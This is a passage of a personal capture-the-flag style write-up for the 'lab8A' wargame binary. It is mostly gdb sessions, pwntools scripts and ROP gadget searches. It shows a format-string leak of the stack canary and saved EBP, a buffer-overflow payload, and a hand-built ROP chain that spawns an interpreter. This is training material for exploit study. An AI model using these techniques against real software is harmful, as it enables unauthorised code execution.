+0xbffff528:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff538:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff548:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff558:     0x080ec570      0x00000018      0x00000000      0x00002710
+0xbffff568:     0x00000014      0x00000003      0x00000028      0x00000003
+0xbffff578:     0x00000000      0x00000038      0x00000000      0x0000005b
+0xbffff588:     0x00000000      0x0000006e      0x00000000      0x00000077
+0xbffff598:     0x00000000      0x0000007c      0x00000000      0x00000000
+0xbffff5a8:     0x00000000      0x080ec540      0x00000003      0x00000004
+0xbffff5b8:     0xbffff658      0x08059a29      0x0000656e      0x00000000
+0xbffff5c8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff5d8:     0x080ec570      0x000009b8      0x080f0000      0x00002710
+0xbffff5e8:     0x000009b0      0x0000005e      0x000009c8      0x00000137
+0xbffff5f8:     0x00000026      0x0000005e      0x00000004      0x0000005f
+0xbffff608:     0x00000000      0x0000006e      0x00000000      0x00000077
+0xbffff618:     0x00000000      0x0000007c      0x080ebfdc      0x080ec200
+0xbffff628:     0x00000001      0x080ec247      0x0806d762      0x00000001
+0xbffff638:     0x08052a31      0x00000001      0x080ec247      0x00000001
+0xbffff648:     0x00000000      0x080d1f19      0x080effd8      0x000000c2
+0xbffff658:     0x080ec200      0x0000000a      0x080ec247      0x080ed4d4
+0xbffff668:     0x08051bd4      0x080ec200      0x080ec247      0x00000001
+0xbffff678:     0x08053a35      0x080ec200      0x080ec247      0x00000000
+0xbffff688:     0x080547ff      0x00000001      0x0000000a      0x080c0891
+0xbffff698:     0x0805325d      0x080ec200      0xffffffff      0x080ec200
+0xbffff6a8:     0x080539c8      0x080ec200      0x080ec247      0x00000001
+0xbffff6b8:     0x080ec200      0x080ec200      0x00000002      0x080c0891
+0xbffff6c8:     0x080481a8      0x00000000      0x080ec00c      0xbffff718
+0xbffff6d8:     0x0804f510      0x080ec200      0x080c0894      0xbffff700
+0xbffff6e8:     0x080481a8      0x00000000      0xf8586c00      0xbffff718 <-- THE CANARY (SELECTABOOK)
+0xbffff6f8:     0x080491da      0x080c0894      0x00000000      0x00000002
+0xbffff708:     0x00000000      0xbffff7a4      0x00000001      0xf8586c00 <-- THE CANARY (MAIN)
+0xbffff718:     0x08049990      0x080493da      0x00000001      0xbffff7a4
+0xbffff728:     0xbffff7ac      0x00000000      0x00000000      0x080481a8
+0xbffff738:     0x00000000      0x080ec00c      0x08049990      0x0e0d62ff
+
+
+This is the value of the canary stored by main call:
+gdb-peda$ x/wx 0xbffff714
+0xbffff714:     0xf8586c00
+
+And this is the value of the canary stored by selectABook() call:
+
+gdb-peda$ x/wx 0xbffff6f0
+0xbffff6f0:     0xf8586c00
+
+OK, fine.
+
+Now let's continue and fill our buffer:
+
+gdb-peda$ c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[----------------------------------registers-----------------------------------]
+EAX: 0x1
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ed4e0 --> 0x0
+EDX: 0x1
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f4 --> 0xbffff718 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff4e8 --> 0x80bf7cb --> 0x41007325 ('%s')
+EIP: 0x8048f35 (<selectABook+42>:       lea    eax,[ebp-0x204])
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048f25 <selectABook+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x8048f29 <selectABook+30>:  mov    DWORD PTR [esp],0x80bf7cb
+   0x8048f30 <selectABook+37>:  call   0x804f550 <__isoc99_scanf>
+=> 0x8048f35 <selectABook+42>:  lea    eax,[ebp-0x204]
+   0x8048f3b <selectABook+48>:  mov    DWORD PTR [esp],eax
+   0x8048f3e <selectABook+51>:  call   0x804f4f0 <printf>
+   0x8048f43 <selectABook+56>:  mov    DWORD PTR [esp+0x4],0x80bf7ce
+   0x8048f4b <selectABook+64>:  lea    eax,[ebp-0x204]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4e8 --> 0x80bf7cb --> 0x41007325 ('%s')
+0004| 0xbffff4ec --> 0xbffff4f0 ('A' <repeats 200 times>...)
+0008| 0xbffff4f0 ('A' <repeats 200 times>...)
+0012| 0xbffff4f4 ('A' <repeats 200 times>...)
+0016| 0xbffff4f8 ('A' <repeats 200 times>...)
+0020| 0xbffff4fc ('A' <repeats 200 times>...)
+0024| 0xbffff500 ('A' <repeats 200 times>...)
+0028| 0xbffff504 ('A' <repeats 200 times>...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 3, 0x08048f35 in selectABook ()
+
+Breakpoint 3, 0x08048f35 in selectABook ()
+gdb-peda$ x/300wx $esp
+0xbffff4e8:     0x080bf7cb      0xbffff4f0      0x41414141      0x41414141
+0xbffff4f8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff508:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff518:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff528:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff538:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff548:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff558:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff568:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff578:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff588:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff598:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5a8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5b8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5c8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5d8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5e8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff5f8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff608:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff618:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff628:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff638:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff648:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff658:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff668:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff678:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff688:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff698:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6a8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6b8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6c8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6d8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6e8:     0x41414141      0x41414141      0xf8586c00      0xbffff718 <-- the canary 0xf8586c00 
+0xbffff6f8:     0x080491da      0x080c0894      0x00000000      0x00000002
+0xbffff708:     0x00000000      0xbffff7a4      0x00000001      0xf8586c00
+0xbffff718:     0x08049990      0x080493da      0x00000001      0xbffff7a4
+
+
+OK, so now we know how to print the stack canary with a format string. It's literally the 128-th dword starting from the buff[512], starting from 0. 
+
+For fucks sake, printf() is acting totally weird here. Can't really find the value I am searching for.
+
+
+First, it is not accepting the format we used before (%$NUMp). Second, it prints different stuff than expected (clearly the num does not work here):
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %200p
+                                                                                                                                                                                              0xbffff480
+What were you thinking, that isn't a good book.%200p%200p%200p
+                                                                                                                                                                                              0xbffff26c                                                                                                                                                                                              0x30303225                                                                                                                                                                                              0x30322570
+What were you thinking, that isn't a good book.^C
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+And now this:
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %s%s%s%
+Segmentation fault (core dumped)
+
+Oh fuck, we were using wrong format - from our own write up. We have to fix it now!
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %132$p
+0x80491da
+
+We can see that 132 is the saved ret.
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %131$p
+0xbffff6a8
+
+And 131 is the saved EBP.
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %130$p
+0x663dd800
+
+And here is the canary. Honestly was surprised it was not $129, which prints out nil. Ah fair enough.
+First argument is the address of the buffer.
+
+OK, so we can leak what we need. Let's exploit it, write it up and get this over with (and proceed to lab9 CPP!).
+
+So, %130$p-%131$p is our leak string.
+
+Now, we can see how it works by leaking both canary and the saved EBP several times in recurrent selectABook() calls:
+
+lab8A@warzone:/tmp$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %130$p-%131$p
+0xb106d00-0xbffff6a8
+What were you thinking, that isn't a good book.%130$p-%131$p
+0xb106d00-0xbffff684
+What were you thinking, that isn't a good book.%130$p-%131$p
+0xb106d00-0xbffff470
+What were you thinking, that isn't a good book.^C
+
+OK. We're good. As expected, the canary stays the same within one instance of the process and across selectABook() calls, while EBP keeps decreasing as these are recurrent calls.
+
+OK. So we can overflow the second selectABook() call to overwrite back the canary and smash the saved ret, following it with the rest of the ROP chain. It will call selectABook() for the third time and we will have to provide it with "A" (so it calls readA()) to make it stop recurring.
+
+So, I don't think we even need to call findSomeWords() and try to attack it at all.
+
+
+Also, no system() is linked. We'll assemble a ROP-based shellcode.
+
+OK. We will also deliver "/bin/sh" somewhere (the first string sounds nice, as we want it to be null-terminated, while other two strings provided to selectAABook() instances input are not suitable.
+
+The second will be used to overwrite the saved RET and will be followed by the ROP chain, however OK, we could put it there too), while the third one has to have an arbitrary value in order to discontinue the recurrence.
+
+
+Let's start with the exploit!
+
+from pwn import *
+settings = {
+    "binary"        : "/tmp/lab8A",
+}
+def exploit():
+    print("PID: "+str(pidof(p)))
+    pause()
+    p.sendlineafter("Enter Your Favorite Author's Last Name: ","%130$p-%131$p/bin/sh")
+    leak=p.recv()
+	pause()
+    return 0
+# Initial setup
+if __name__  == "__main__":
+    binary = ELF(settings['binary'])
+    context.log_level = 'debug'
+    p = process(binary.path,stdin=PTY)
+    exploit()
+
+OK, we want to calculate the address of the "/bin/sh" string based on the first leak.
+
+
+lab8A@warzone:/tmp$ python exploit.py
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[*] '/tmp/lab8A'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process '/tmp/lab8A': pid 6720
+PID: [6720]
+[*] Paused (press any to continue)
+[DEBUG] Received 0xdf bytes:
+    '\n'
+    '\n'
+    '\n'
+    '**********************************************\n'
+    "{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n"
+    '**********************************************\n'
+    '\n'
+    '\t==> reading is for everyone <==\n'
+    "\t[+] Enter Your Favorite Author's Last Name: "
+[DEBUG] Sent 0x15 bytes:
+    '%130$p-%131$p/bin/sh\n'
+[DEBUG] Received 0x4b bytes:
+    '0xf929400-0xbffff6b8/bin/sh\n'
+    "What were you thinking, that isn't a good book."
+[*] Paused (press any to continue)
+
+gdb-peda$ searchmem /bin 0xbffdf000 0xc0000000
+Searching for '/bin' in range: 0xbffdf000 - 0xc0000000
+Found 8 results, display max 8 items:
+[stack] : 0xbffff49d ("/bin/sh")
+[stack] : 0xbffff889 ("/bin/lesspipe %s")
+[stack] : 0xbffff8f3 ("/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffff906 ("/bin:/sbin:/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffff911 ("/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffff9d2 ("/bin/bash")
+[stack] : 0xbffffa2c ("/bin/python")
+[stack] : 0xbffffa78 ("/bin/lesspipe %s %s")
+
+So, 0xbffff6b8 is the saved EBP, while 0xbffff49d is where our "/bin/sh" landed.
+
+gdb-peda$ p 0xbffff6b8-0xbffff49d
+$1 = 0x21b
+
+So, we subtract 0x21b from our leaked EBP to get the "/bin/sh" location.
+
+We don't really have to use the /bin/sh here. Could use that existing /bin/python as well!
+
+lab8A@warzone:/tmp$ echo $((0xbffffa2c-0xbffff6b8))
+884
+lab8A@warzone:/tmp$ echo $((0xbffff6b8+884))
+3221223980
+lab8A@warzone:/tmp$ printf "%x" 3221223980
+bffffa2clab8A@warzone:/tmp$
+
+So, we add 884 from the leaked EBP and we get the address of /bin/python.
+
+OK, now our exploit looks like this:
+
+from pwn import *
+settings = {
+    "binary"        : "/tmp/lab8A",
+}
+def exploit():
+    print("PID: "+str(pidof(p)))
+    pause()
+    p.sendlineafter("Enter Your Favorite Author's Last Name: ","%130$p-%131$p")
+    leak=str(p.recvline()).split("-")
+    canary=leak[0]
+    EBP=leak[1]
+    print("Canary: "+canary)
+    print("EBP: "+EBP)
+	
+    canary_value = int(canary,16)
+    EBP_value = int(EBP,16)
+    
+    python_addr = EBP_value + 884 	# based on leaked EBP, calculate the address of the "/bin/python" string
+    print("/bin/python address: %x" % python_addr)
+
+    # Binary is statically compiled, we don't need to leak the code segment.
+    ROP = ""
+
+    payload = "A"*512	# overflow the buf[512] in the second selectABook() call, overwrite the canary with itself and put the ROP in place
+    payload = payload + p32(canary) + p32(EBP) + ROP + p8(0x0)
+    p.sendafter("What were you thinking, that isn't a good book.",payload)
+	# Send "A" to convince the third call of selectABook() to call readA() and return instead of calling itself again (prevent further recurrence).
+    p.sendafter("What were you thinking, that isn't a good book.","A")
+
+    return 0
+# Initial setup
+if __name__  == "__main__":
+    binary = ELF(settings['binary'])
+    context.log_level = 'debug'
+    p = process(binary.path,stdin=PTY)
+    exploit()
+
+
+
+Now the only thing we need is the ROP chain.
+
+So, a normal shellcode goes like this:
+
+eax = $0xb
+ebx = /bin/python
+ecx = edx = $0
+int $0x80
+
+lab8A@warzone:/tmp$ python ropeme-master/ropeme/ropshell.py
+Simple ROP interactive shell: [generate, load, search] gadgets
+ROPeMe> generate /tmp/lab8A
+Generating gadgets for /tmp/lab8A with backward depth=3
+It may take few minutes depends on the depth and file size...
+Processing code block 1/1
+Generated 7496 gadgets
+Dumping asm gadgets to file: lab8A.ggt ...
+OK
+ROPeMe> load /tmp/lab8A.ggt
+Loading asm gadgets from file: /tmp/lab8A.ggt ...
+Loaded 7496 gadgets
+ELF base address: 0x8048000
+OK
+
+ROPeMe> search pop ebx
+Searching for ROP gadget:  pop ebx with constraints: []
+0x80481c9L: pop ebx ;;
+0x804d7d6L: pop ebx ;;
+0x804fb14L: pop ebx ;;
+
+ROPeMe> search pop eax
+Searching for ROP gadget:  pop eax with constraints: []
+0x80bc506L: pop eax ;;
+0x80e4809L: pop eax ;;
+0x80e686eL: pop eax ;;
+
+
+
+Oh, one more thing. If the canary contains a nullbyte, we can't exploit it (as we won't be able to overwrite the saved RET). But that's OK, it is random, we'll just run the program again to get a new one.
+
+ROPeMe>  search xor ? ?
+Searching for ROP gadget:  xor ? ? with constraints: []
+0x80a6aacL: xor al 0x83 ;;
+0x80d8ecaL: xor al 0xd8 ;;
+0x807bc68L: xor bh al ;;
+0x80adfd0L: xor eax 0x89000008 ;;
+0x8054ab0L: xor eax eax ;;
+0x80554b0L: xor eax eax ;;
+0x80554f0L: xor eax eax ;;
+
+ROPeMe>  search xchg ? ?
+Searching for ROP gadget:  xchg ? ? with constraints: []
+0x8057f68L: xchg ebp eax ;;
+0x80790bdL: xchg ebp eax ;;
+0x809f65fL: xchg ebp eax ;;
+0x80aa07cL: xchg edx eax ;;
+0x80aa955L: xchg edx eax ;; <-- we want to use this to put 0 to edx after calling xor eax eax
+0x80ad0ccL: xchg edx eax ;;
+0x804b68cL: xchg esp eax ;;
+0x8058028L: xchg esp eax ;;
+0x8098a3bL: xchg esp eax ;;
+
+Well, I can't find a way to propagate 0 to ecx (again, we can't use pop ecx directly).
+Oh, problem solved:
+ROPeMe> search dec ecx
+Searching for ROP gadget:  dec ecx with constraints: []
+0x806e55bL: dec ecx ;;
+0x8083b5aL: dec ecx ;;
+0x80e3e19L: dec ecx ;;
+
+We'll use pop ecx with "1" and then dec ecx; to make it 0.
+
+ROPeMe> search pop ecx
+Searching for ROP gadget:  pop ecx with constraints: []
+0x80e71c5L: pop ecx ;;
+
+ROPeMe> search inc ecx
+Searching for ROP gadget:  inc ecx with constraints: []
+0x80dcb34L: inc ecx ;;
+0x80dcb8aL: inc ecx ;;
+0x80dcbf4L: inc ecx ;;
+
+ROPeMe> search int 0x80
+Searching for ROP gadget:  int 0x80 with constraints: []
+0x806f900L: int 0x80 ;; <-- shit, nulls... and I guess the endianness will not help us here even though this is the last address... but how about just shooting above it?
+
+gdb-peda$ x/4i 0x806f900-4
+   0x806f8fc:   nop
+   0x806f8fd:   xchg   ax,ax
+   0x806f8ff:   nop
+   0x806f900 <_dl_sysinfo_int80>:       int    0x80
+
+Yes :D 0x806f8ff points at a NOP.
+
+
+OK, let's build our ROP chain then:
+EDX = 0
+0x80554f0L: // xor eax eax ;;
+0x80aa955L: // xchg edx eax ;;	 
+
+EAX = 0xb - for execve()... fuck, this will contain nullbytes - starting to understand why using findSomeWords() would be easier, but we can get around this
+0x80554f0L: // xor eax eax ;; -> EAX = 0
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+0x80ea08bL: // inc eax ;;
+
+ECX = 0
+0x80e71c5L: // pop ecx ;;
+0xffffffff  // new ECX
+0x80dcbf4L: // inc ecx ;; // overflow ECX to 0
+
+EBX = "/bin/python"
+0x804fb14L: pop ebx ;;
+0xbffffa2c	// the address of /bin/python - just in case use the dynamically calculated one instead of this sample fixed one
+
+INT 0x80
+0x806f8ff	// int 0x80
+ 
+By the way we could use some initial values of the registers, but I was too lazy to look them up at the time of the return from selectABook(), while this approach makes the ROP shellcode reliable regardless to those values.
+
+
+Keeps failing due to canary ending up with a nullbyte.
+
+    "What were you thinking, that isn't a good book."
+Canary: 0xcdccde00
+EBP: 0xbffff6b8
+
+Fucky. I guess it's null-armor (which downgrades the entropy by the way).
+OK. We'll call findSomeWords() to get around this.
+
+
+Just need to make sure that global_addr_check in fact contains the canary or rather its part (those +0x1,-0x2 shifts confuse me a bit):
+
+void findSomeWords() {
+    /* We specialize in words of wisdom */
+    char buf[24];
+    // to avoid the null
+    global_addr = (&buf+0x1);
+    // have to make sure no one is stealing the librarians cookies (they get angry)
+    global_addr_check = global_addr-0x2;
+    char lolz[4];
+
+    printf("\n..I like to read ^_^ <==  ");
+    read(STDIN, buf, 2048); // >> read a lot every day ! // another big overflow with no bad chars
+	// so we must make global_addr_check == 0xdeadbeef, not sure if this is the cookie itself or just sth we must overwrite (and thus also steal and overwrite the stak protector in selectABook() function)... but fuck it, I want shell - well OK, we won't get a shell by overwriting RET if we fail to bypass this
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+        printf("\n\nWoah There\n");
+        // why are you trying to break my program q-q
+        exit(EXIT_FAILURE);
+    }
+
+    // protected by my CUSTOM cookie - so soooo safe now
+    return;
+}
+
+Once we know this, we just XOR the expected canary value with 0xdeadbeef, fill the buffer and use our ROP.
+
+
+gdb-peda$ disas selectABook
+Dump of assembler code for function selectABook:
+   0x08048f0b <+0>:     push   ebp
+   0x08048f0c <+1>:     mov    ebp,esp
+   0x08048f0e <+3>:     sub    esp,0x20c
+   0x08048f14 <+9>:     mov    eax,gs:0x14
+   0x08048f1a <+15>:    mov    DWORD PTR [ebp-0x4],eax
+   0x08048f1d <+18>:    xor    eax,eax
+   0x08048f1f <+20>:    lea    eax,[ebp-0x204]
+   0x08048f25 <+26>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048f29 <+30>:    mov    DWORD PTR [esp],0x80bf7cb
+   0x08048f30 <+37>:    call   0x804f550 <__isoc99_scanf>
+   0x08048f35 <+42>:    lea    eax,[ebp-0x204]
+   0x08048f3b <+48>:    mov    DWORD PTR [esp],eax
+   0x08048f3e <+51>:    call   0x804f4f0 <printf>
+   0x08048f43 <+56>:    mov    DWORD PTR [esp+0x4],0x80bf7ce
+   0x08048f4b <+64>:    lea    eax,[ebp-0x204]
+   0x08048f51 <+70>:    mov    DWORD PTR [esp],eax
+   0x08048f54 <+73>:    call   0x8048280
+   0x08048f59 <+78>:    test   eax,eax
+   0x08048f5b <+80>:    jne    0x8048f64 <selectABook+89>
+   0x08048f5d <+82>:    call   0x8048fe1 <readA>
+   0x08048f62 <+87>:    jmp    0x8048fcd <selectABook+194>
+   0x08048f64 <+89>:    mov    DWORD PTR [esp+0x4],0x80bf7d0
+   0x08048f6c <+97>:    lea    eax,[ebp-0x204]
+   0x08048f72 <+103>:   mov    DWORD PTR [esp],eax
+   0x08048f75 <+106>:   call   0x8048280
+   0x08048f7a <+111>:   test   eax,eax
+   0x08048f7c <+113>:   jne    0x8048f85 <selectABook+122>
+   0x08048f7e <+115>:   call   0x8049035 <readB>
+   0x08048f83 <+120>:   jmp    0x8048fcd <selectABook+194>
+   0x08048f85 <+122>:   movzx  eax,BYTE PTR [ebp-0x204]
+   0x08048f8c <+129>:   test   al,al
+   0x08048f8e <+131>:   jne    0x8048f97 <selectABook+140>
+   0x08048f90 <+133>:   call   0x8049089 <readC>
+   0x08048f95 <+138>:   jmp    0x8048fcd <selectABook+194>
+   0x08048f97 <+140>:   lea    eax,[ebp-0x204]
+   0x08048f9d <+146>:   cmp    eax,0x539
+   0x08048fa2 <+151>:   jne    0x8048fbc <selectABook+177>
+   0x08048fa4 <+153>:   mov    DWORD PTR [esp],0x80bf7d4
+   0x08048fab <+160>:   call   0x804fb60 <puts>
+   0x08048fb0 <+165>:   mov    DWORD PTR [esp],0x1
+   0x08048fb7 <+172>:   call   0x804eb00 <exit>
+   0x08048fbc <+177>:   mov    DWORD PTR [esp],0x80bf7f8
+   0x08048fc3 <+184>:   call   0x804f4f0 <printf>
+   0x08048fc8 <+189>:   call   0x8048f0b <selectABook>
+   0x08048fcd <+194>:   nop
+   0x08048fce <+195>:   mov    eax,DWORD PTR [ebp-0x4]
+   0x08048fd1 <+198>:   xor    eax,DWORD PTR gs:0x14
+   0x08048fd8 <+205>:   je     0x8048fdf <selectABook+212>
+   0x08048fda <+207>:   call   0x806f490 <__stack_chk_fail>
+   0x08048fdf <+212>:   leave
+   0x08048fe0 <+213>:   ret
+End of assembler dump.
+gdb-peda$ b *(selectABook+15)
+gdb-peda$ disas findSomeWords
+
+Dump of assembler code for function findSomeWords:
+   0x080490dd <+0>:     push   ebp
+   0x080490de <+1>:     mov    ebp,esp
+   0x080490e0 <+3>:     sub    esp,0x28
+   0x080490e3 <+6>:     mov    eax,gs:0x14
+   0x080490e9 <+12>:    mov    DWORD PTR [ebp-0x4],eax
+   0x080490ec <+15>:    xor    eax,eax
+   0x080490ee <+17>:    lea    eax,[ebp-0x1c]
+   0x080490f1 <+20>:    add    eax,0x18
+   0x080490f4 <+23>:    mov    ds:0x80edf20,eax
+   0x080490f9 <+28>:    mov    eax,ds:0x80edf20
+   0x080490fe <+33>:    sub    eax,0x8
+   0x08049101 <+36>:    mov    ds:0x80edf24,eax
+   0x08049106 <+41>:    mov    DWORD PTR [esp],0x80c0868
+   0x0804910d <+48>:    call   0x804f4f0 <printf>
+   0x08049112 <+53>:    mov    DWORD PTR [esp+0x8],0x800
+   0x0804911a <+61>:    lea    eax,[ebp-0x1c]
+   0x0804911d <+64>:    mov    DWORD PTR [esp+0x4],eax
+   0x08049121 <+68>:    mov    DWORD PTR [esp],0x0
+   0x08049128 <+75>:    call   0x806d6d0 <read>
+   0x0804912d <+80>:    mov    eax,ds:0x80edf20
+   0x08049132 <+85>:    mov    edx,DWORD PTR [eax]
+   0x08049134 <+87>:    mov    eax,ds:0x80edf24
+   0x08049139 <+92>:    mov    eax,DWORD PTR [eax]
+   0x0804913b <+94>:    xor    eax,edx
+   0x0804913d <+96>:    mov    edx,eax
+   0x0804913f <+98>:    mov    eax,ds:0x80edf20
+   0x08049144 <+103>:   mov    eax,DWORD PTR [eax]
+   0x08049146 <+105>:   xor    eax,0xdeadbeef
+   0x0804914b <+110>:   cmp    edx,eax
+   0x0804914d <+112>:   je     0x8049167 <findSomeWords+138>
+   0x0804914f <+114>:   mov    DWORD PTR [esp],0x80c0884
+   0x08049156 <+121>:   call   0x804fb60 <puts>
+   0x0804915b <+126>:   mov    DWORD PTR [esp],0x1
+   0x08049162 <+133>:   call   0x804eb00 <exit>
+   0x08049167 <+138>:   nop
+   0x08049168 <+139>:   mov    eax,DWORD PTR [ebp-0x4]
+   0x0804916b <+142>:   xor    eax,DWORD PTR gs:0x14
+   0x08049172 <+149>:   je     0x8049179 <findSomeWords+156>
+   0x08049174 <+151>:   call   0x806f490 <__stack_chk_fail>
+   0x08049179 <+156>:   leave
+   0x0804917a <+157>:   ret
+End of assembler dump.
+
+We're especially interested in this section:
+   0x0804913b <+94>:    xor    eax,edx
+   0x0804913d <+96>:    mov    edx,eax
+   0x0804913f <+98>:    mov    eax,ds:0x80edf20
+   0x08049144 <+103>:   mov    eax,DWORD PTR [eax]
+   0x08049146 <+105>:   xor    eax,0xdeadbeef
+   0x0804914b <+110>:   cmp    edx,eax
+   0x0804914d <+112>:   je     0x8049167 <findSomeWords+138>
+   0x0804914f <+114>:   mov    DWORD PTR [esp],0x80c0884
+   0x08049156 <+121>:   call   0x804fb60 <puts>
+   
+Let's put a breakpoint at 0x08049144 (findSomeWords+103).
+
+gdb-peda$ b *(findSomeWords+103)
+Breakpoint 2 at 0x8049144
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: [----------------------------------registers-----------------------------------]
+EAX: 0x6126ac00
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xffffffff
+EDX: 0x80ed4d4 --> 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff704 --> 0xbffff728 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff4f8 --> 0x0
+EIP: 0x8048f1a (<selectABook+15>:       mov    DWORD PTR [ebp-0x4],eax)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048f0c <selectABook+1>:   mov    ebp,esp
+   0x8048f0e <selectABook+3>:   sub    esp,0x20c
+   0x8048f14 <selectABook+9>:   mov    eax,gs:0x14
+=> 0x8048f1a <selectABook+15>:  mov    DWORD PTR [ebp-0x4],eax
+   0x8048f1d <selectABook+18>:  xor    eax,eax
+   0x8048f1f <selectABook+20>:  lea    eax,[ebp-0x204]
+   0x8048f25 <selectABook+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x8048f29 <selectABook+30>:  mov    DWORD PTR [esp],0x80bf7cb
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4f8 --> 0x0
+0004| 0xbffff4fc --> 0x0
+0008| 0xbffff500 --> 0x0
+0012| 0xbffff504 --> 0x0
